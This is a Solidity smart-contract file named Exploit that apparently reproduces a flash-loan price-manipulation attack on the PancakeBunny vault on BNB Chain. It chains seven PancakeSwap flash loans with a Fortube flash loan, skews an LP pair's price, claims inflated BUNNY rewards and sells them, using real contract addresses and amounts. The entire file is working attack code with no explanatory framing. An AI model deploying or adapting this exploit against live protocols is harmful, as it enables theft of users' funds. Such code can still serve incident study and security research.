// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces.sol";

contract Exploit {
    address owner;
    uint step;

    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BUNNY = IERC20(0xC9849E6fdB743d08fAeE3E34dd2D1bc69EA11a51);

    
    IZap ZapBSC = IZap(0xdC2bBB0D33E0e7Dea9F5b98F46EDBaC823586a0C);
    IPancakeERC20 Pair_PancakeLps = IPancakeERC20(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IVaultFlipToFlip PancakeBunny_FLIP_USDT_BNB = IVaultFlipToFlip(0x633e538EcF0bee1a18c2EDFE10C4Da0d6E71e77B);

    address[7] flashloanPairs = [
        0x0eD7e52944161450477ee417DE9Cd3a859b14fD0, // 1051687744972121462519028
        0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, // 522524038650282621597596
        0x74E4716E431f45807DCF19f284c7aA99F18a4fbc, // 210158598370675048673190
        0x61EB789d75A95CAa3fF50ed7E47b96c132fEc082, // 133504753267096047023128
        0x9adc6Fb78CEFA07E13E9294F150C1E8C1Dd566c0, // 241021487428194992833789
        0xF3Bc6FC080ffCC30d93dF48BFA2aA14b869554bb, // 98189677482110262659207
        0xDd5bAd8f8b360d76d12FdA230F8BAF42fe0022CF  // 66290233896773473957091
    ];

    IFortubeBank FortubeBank = IFortubeBank(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672); //2961750450987026369366661
    IPancakePair PancakeBunny_FLIP_USDT_BNB_v1 = IPancakePair(0x20bCC3b8a0091dDac2d0BC30F68E6CBb97de59Cd);
    IPancakePair WBNB_BUNNY = IPancakePair(0x7Bb89460599Dbf32ee3Aa50798BBcEae2A5F7f6a);
    IPancakeRouter01 router = IPancakeRouter01(payable(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F));
    
    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner(){
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    // Start with the first tx
    function start() public onlyOwner {
        WBNB.approve(address(ZapBSC), 1e18);
        ZapBSC.zapInToken(address(WBNB), 1e18, address(Pair_PancakeLps));

        uint received_LPs = Pair_PancakeLps.balanceOf(address(this));
        Pair_PancakeLps.approve(address(PancakeBunny_FLIP_USDT_BNB), received_LPs);
        PancakeBunny_FLIP_USDT_BNB.deposit(received_LPs);
    }

    function main() public onlyOwner{
        (uint amount0, uint amount1, ) = IPancakePair(flashloanPairs[0]).getReserves();
        if (address(WBNB) == IPancakePair(flashloanPairs[0]).token1()){ 
            IPancakePair(flashloanPairs[0]).swap(0, amount1 - 1, address(this), abi.encode(0, 1));
        } else {
            IPancakePair(flashloanPairs[0]).swap(amount0 - 1, 0, address(this), abi.encode(0, 0));
        }
    }

    function pancakeCall(address _sender, uint _amount0Out, uint _amount1Out, bytes calldata _data) external {
        (, uint asset) = abi.decode(_data, (uint, uint));
        step += 1;
        if(step < 7){
            (uint amount0, uint amount1, ) = IPancakePair(flashloanPairs[step]).getReserves();
            if (address(WBNB) == IPancakePair(flashloanPairs[step]).token1()){
                IPancakePair(flashloanPairs[step]).swap(0, amount1 - 1, address(this), abi.encode(0, 1));
            } else { 
                IPancakePair(flashloanPairs[step]).swap(amount0 - 1, 0, address(this), abi.encode(0, 0));
            }
        } else { // on the last call take flashloan from fortube
            FortubeBank.flashloan(address(this), address(BSC_USD), 2961750450987026369366661, "0x");
        }

        //repay each PCS flashloan
        uint256 retAmount = asset == 0 ? ((_amount0Out * 10000) / 9975 + 1) : ((_amount1Out * 10000) / 9975 + 1);
        require(WBNB.balanceOf(address(this)) >= retAmount, "not making proift");
        WBNB.transfer(msg.sender, retAmount);
    }
    
    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external {
        attack();
        BSC_USD.transfer(FortubeBank.controller(), 2961750450987026369366661 + 2369400360789621095493);
    }

    function attack() private {
        uint WBNB_amount = WBNB.balanceOf(address(this)) - 15000e18;

        // add loaned liquidity
        WBNB.approve(address(ZapBSC), type(uint256).max);
        ZapBSC.zapInToken(address(WBNB), 15000e18, address(Pair_PancakeLps));
        Pair_PancakeLps.transfer(address(Pair_PancakeLps), Pair_PancakeLps.balanceOf(address(this)));

        // pair PancakeBunny_FLIP_USDT_BNB_v1 manipulation
        (uint amount_0, uint amount_1, ) = IPancakePair(PancakeBunny_FLIP_USDT_BNB_v1).getReserves();
        uint amount_In = WBNB_amount;
        uint amount_Out = router.getAmountOut(amount_In, amount_1, amount_0);

        WBNB.transfer(address(PancakeBunny_FLIP_USDT_BNB_v1), amount_In);
        PancakeBunny_FLIP_USDT_BNB_v1.swap(amount_Out, 0, address(this), "");

        PancakeBunny_FLIP_USDT_BNB.getReward();

        uint bunnyBalance = BUNNY.balanceOf(address(this)) - 1;
        (uint amount0, uint amount1, ) = WBNB_BUNNY.getReserves();
        uint amountIn = bunnyBalance;
        uint amountOut = router.getAmountOut(bunnyBalance, amount1, amount0);

        BUNNY.transfer(address(WBNB_BUNNY), amountIn);
        WBNB_BUNNY.swap(amountOut, 0, address(this), "");
    }
}